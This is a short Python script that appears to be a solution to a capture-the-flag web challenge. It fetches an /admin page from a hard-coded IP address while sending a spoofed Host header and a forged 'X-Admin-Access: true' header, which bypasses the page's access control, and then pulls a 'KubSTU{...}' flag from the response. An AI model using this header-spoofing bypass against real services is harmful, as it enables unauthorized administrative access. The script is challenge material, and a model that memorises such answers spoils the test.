import os, requests, re

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    with requests.Session() as ses:
        headers = {
            "Host": "admin.challenge.local:8081",
            "X-Admin-Access": "true",
            "Connection": "close",
        }
        response = ses.get(f"{url}/admin", headers = headers, stream = True, timeout = 5)
        data = b""
        while b"}" not in data:
            data += response.raw.read(1)
        flag = get_flag(data.decode(), prefix)
    return flag

if __name__ == "__main__":
    url = "http://159.194.199.67:5000"
    prefix = "KubSTU"
    print(solution(url, prefix))
    